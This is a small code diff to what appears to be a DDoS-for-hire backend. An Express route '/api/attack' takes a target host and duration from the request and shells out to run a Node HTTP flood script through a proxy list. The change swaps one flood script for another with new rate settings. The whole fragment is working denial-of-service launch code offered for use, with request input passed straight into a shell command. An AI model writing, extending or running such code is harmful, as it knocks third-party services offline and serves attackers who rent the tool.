@@ -109,7 +109,7 @@ app.get("/api/attack", (req, res) => {
 
   if (method.toLowerCase() === "flood") {
     executeCommand(
-      `node @ThaiDuongScript ${host} ${time} 7 http.txt 20 flood true`,
+      `node bestflood ${host} ${time} 60 5 http.txt`,
       () => {}
     );
   }
